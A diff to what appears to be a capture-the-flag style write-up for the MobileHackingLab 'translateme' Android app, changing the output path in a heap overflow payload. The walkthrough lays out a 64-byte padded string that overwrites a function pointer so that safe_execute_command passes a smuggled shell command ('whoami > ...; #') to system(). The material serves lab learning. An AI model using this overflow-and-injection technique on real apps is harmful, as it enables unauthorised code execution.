@@ -412,7 +412,7 @@ malloc(0x148) allocates structure:
 We need to send exactly **64 bytes of padding** followed by the address of `safe_execute_command`:
 ```
 Payload structure:
-[0-X]:   Command + shell comment (e.g., "whoami > /tmp/test; # ")
+[0-X]:   Command + shell comment (e.g., "whoami > /data/data/com.mobilehackinglab.translateme/whoami; # ")
 [X-63]:  Padding to reach 64 bytes total ('A' characters)
 [64-71]: Address of safe_execute_command (8 bytes, little-endian)
 ```
@@ -428,7 +428,7 @@ __memcpy_chk(__ptr, param_1, strlen(param_1), 0xffffffffffffffff);
 
 Memory becomes:
 ```
-0x0000: ["whoami > /tmp/test; # AAA..."] (command + padding = 64 bytes)
+0x0000: ["whoami > /data/data/com.mobilehackinglab.translateme/whoami; # AAA..."] (command + padding = 64 bytes)
 0x0040: [safe_execute_command] <- Overwritten with our target address!
 0x0048: [remaining bytes if any...]
 ```
@@ -447,14 +447,14 @@ if ((*(long *)((long)__ptr + 0x40) != 0) &&
 
 Since our function pointer now points to `safe_execute_command`, this effectively becomes:
 ```c
-safe_execute_command("whoami > /tmp/test; # AAAA...<address_bytes>");
+safe_execute_command("whoami > /data/data/com.mobilehackinglab.translateme/whoami; # AAAA...<address_bytes>");
 ```
 
 ### Step 5: Command Execution
 
 The `safe_execute_command` function receives our full payload string and passes it to `system()`. `; #` shell commenting:
 
-- The shell executes: `whoami > /tmp/test`
+- The shell executes: `whoami > /data/data/com.mobilehackinglab.translateme/whoami`
 - Everything after` # `is treated as a comment and ignored
 - The padding characters and binary address bytes don't crash the shell
 
